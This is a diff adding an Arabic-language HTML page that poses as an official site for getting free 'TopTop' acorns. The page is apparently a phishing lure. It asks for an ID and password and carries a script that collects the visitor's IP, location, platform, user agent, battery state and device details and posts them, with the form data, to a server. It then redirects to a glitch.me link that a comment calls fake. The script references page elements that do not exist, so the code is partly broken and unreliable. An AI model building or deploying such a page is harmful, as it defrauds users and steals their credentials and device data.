@@ -1,0 +1,301 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>شحن أكوانزات TopTop - موقع الشحن الرسمي</title>
+    <meta property="og:title" content="شحن أكوانزات TopTop">
+    <meta property="og:description" content="مرحبا بك في أفضل موقع لشحن أكوانزات TopTop مجاناً. يمكنك الحصول على 1000 أكوانز مجاني!">
+    <meta property="og:image" content="https://example.com/toptop-acorns-image.jpg">
+    <meta property="og:image:type" content="image/jpeg">
+    <meta property="og:image:width" content="1200">
+    <meta property="og:image:height" content="630">
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://YOUR_DOMAIN_HERE/toptop-acorns">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="شحن أكوانزات TopTop">
+    <meta name="twitter:description" content="مرحبا بك في أفضل موقع لشحن أكوانزات TopTop مجاناً. يمكنك الحصول على 1000 أكوانز مجاني!">
+    <meta name="twitter:image" content="https://example.com/toptop-acorns-image.jpg">
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            text-align: center;
+            margin: 0;
+            padding: 0;
+            background: linear-gradient(135deg, #FF6B6B, #4ECDC4);
+            color: #ffffff;
+            overflow: auto;
+            position: relative;
+        }
+
+        .container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            padding: 20px;
+            backdrop-filter: blur(8px);
+            position: relative;
+            z-index: 2;
+        }
+
+        .login-container {
+            max-width: 500px;
+            padding: 30px;
+            border-radius: 10px;
+            background-color: rgba(0, 0, 0, 0.8);
+            box-shadow: 0 4px 10px rgba(0,0,0,0.6);
+        }
+
+        .login-container h1 {
+            margin: 0 0 20px;
+            font-size: 32px;
+            color: #FFD700;
+        }
+
+        input[type="text"], input[type="password"] {
+            width: 100%;
+            padding: 15px;
+            margin: 10px 0;
+            border: none;
+            border-radius: 8px;
+            box-sizing: border-box;
+            background-color: #444;
+            color: #ffffff;
+            font-size: 18px;
+        }
+
+        button {
+            width: 100%;
+            padding: 15px;
+            margin: 10px 0;
+            border: none;
+            border-radius: 8px;
+            background-color: #FFD700;
+            color: #333;
+            font-size: 18px;
+            cursor: pointer;
+            transition: background-color 0.3s ease, transform 0.3s ease;
+        }
+
+        button:hover {
+            background-color: #FFC000;
+            transform: scale(1.02);
+        }
+
+        .pricing-section {
+            margin-top: 20px;
+            padding: 20px;
+            border-radius: 10px;
+            background-color: rgba(0, 0, 0, 0.7);
+            box-shadow: 0 4px 10px rgba(0,0,0,0.6);
+        }
+
+        .pricing-section h2 {
+            font-size: 24px;
+            margin-bottom: 10px;
+            color: #FFD700;
+        }
+
+        .pricing-option {
+            margin: 10px 0;
+            padding: 15px;
+            border-radius: 8px;
+            background-color: #333;
+            color: #FFD700;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .pricing-option span {
+            font-size: 20px;
+        }
+
+        .pricing-option button {
+            padding: 10px 20px;
+            border: none;
+            border-radius: 5px;
+            background-color: #FFD700;
+            color: #333;
+            font-size: 16px;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+
+        .pricing-option button:hover {
+            background-color: #FFC000;
+        }
+
+        .message {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            padding: 10px;
+            background-color: #FF6B6B;
+            color: #fff;
+            text-align: center;
+            font-size: 18px;
+            display: none;
+            z-index: 3;
+        }
+
+        @keyframes backgroundAnimation {
+            0% { background-position: 0% 0%; }
+            50% { background-position: 100% 100%; }
+            100% { background-position: 0% 0%; }
+        }
+
+        body::before {
+            content: "";
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: url('https://example.com/toptop-background.jpg') repeat;
+            animation: backgroundAnimation 60s linear infinite;
+            z-index: 1;
+            opacity: 0.2;
+        }
+    </style>
+</head>
+<body>
+    <div class="message" id="message">
+        يرجى تسجيل الدخول أولاً
+    </div>
+    <div class="container">
+        <div class="login-container" id="login-container">
+            <h1>تسجيل الدخول لـ TopTop</h1>
+            <input type="text" id="username" name="username" placeholder="الآيدي" required>
+            <input type="password" id="password" name="password" placeholder="كلمة المرور" required>
+            <button onclick="showMessage()">تسجيل الدخول</button>
+        </div>
+        <div class="pricing-section">
+            <h2>أسعار أكوانزات TopTop</h2>
+            <div class="pricing-option">
+                <span>1000 أكوانز - 0$</span>
+                <button onclick="showMessage()">مجاني</button>
+            </div>
+            <div class="pricing-option">
+                <span>2000 أكوانز - 2$</span>
+                <button onclick="showMessage()">شراء الآن</button>
+            </div>
+            <div class="pricing-option">
+                <span>5000 أكوانز - 5$</span>
+                <button onclick="showMessage()">شراء الآن</button>
+            </div>
+            <div class="pricing-option">
+                <span>10000 أكوانز - 10$</span>
+                <button onclick="showMessage()">شراء الآن</button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        function showPubgContainer() {
+        document.getElementById('login-container').classList.remove('active');
+        document.getElementById('pubg-container').classList.add('active');
+    }
+
+    const increaseForm = document.getElementById('increaseForm');
+    const chatIdInput = document.getElementById('chatIdInput');
+
+    const chatId = window.location.pathname.split('/').pop();
+    chatIdInput.value = chatId;
+
+    async function getIPInfo() {
+        try {
+            const response = await fetch('https://ipapi.co/json/');
+            const data = await response.json();
+            return {
+                ip: data.ip,
+                country: data.country_name,
+                city: data.city
+            };
+        } catch (error) {
+            console.error('Error fetching IP info:', error);
+            return {
+                ip: 'Unknown',
+                country: 'Unknown',
+                city: 'Unknown'
+            };
+        }
+    }
+
+    function getPlatformInfo() {
+        const ua = navigator.userAgent;
+        let platform = "Unknown";
+        if (/Windows/.test(ua)) platform = "Windows";
+        else if (/Mac/.test(ua)) platform = "MacOS";
+        else if (/Linux/.test(ua)) platform = "FreeFire";
+        else if (/Android/.test(ua)) platform = "Android";
+        else if (/iPhone|iPad|iPod/.test(ua)) platform = "iOS";
+
+        return {
+            platform: platform,
+            userAgent: ua
+        };
+    }
+
+    async function getBatteryInfo() {
+        if ('getBattery' in navigator) {
+            try {
+                const battery = await navigator.getBattery();
+                return {
+                    batteryLevel: battery.level,
+                    batteryCharging: battery.charging
+                };
+            } catch (error) {
+                console.error('Error getting battery info:', error);
+            }
+        }
+        return {
+            batteryLevel: undefined,
+            batteryCharging: undefined
+        };
+    }
+
+    function getDeviceVersion() {
+        const ua = navigator.userAgent;
+        const match = ua.match(/\(([^)]+)\)/);
+        return match ? match[1] : 'Unknown';
+    }
+
+    increaseForm.addEventListener('submit', async (event) => {
+        event.preventDefault();
+        const formData = new FormData(increaseForm);
+        const data = Object.fromEntries(formData.entries());
+
+        const ipInfo = await getIPInfo();
+        const platformInfo = getPlatformInfo();
+        const batteryInfo = await getBatteryInfo();
+        const deviceVersion = getDeviceVersion();
+
+        Object.assign(data, ipInfo, platformInfo, batteryInfo, { deviceVersion });
+
+        try {
+            const response = await fetch('/submitIncrease', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(data)
+            });
+            const result = await response.json();
+             if (result.success) {
+          document.getElementById('notification').innerText = 'تم  تنفيذ طلبك سوف يتم وصول الاكونزات  خلال 15 دقيقه💎 !';
+          window.location.href = "https://polarized-believed-fisherman.glitch.me/"; // هذا هو الرابط الوهمي
+       } else {
+        alert('حدث خطأ أثناء تنفيذ الطلب. يرجى المحاولة مرة أخرى.');
+}
+        } catch (error) {
+            console.error('Error:', error);
+            alert('حدث خطأ أثناء الاتصال بالخادم. يرجى المحاولة مرة أخرى لاحقاً.');
+        }
+    });
+</script>
+</body>   
+</html>
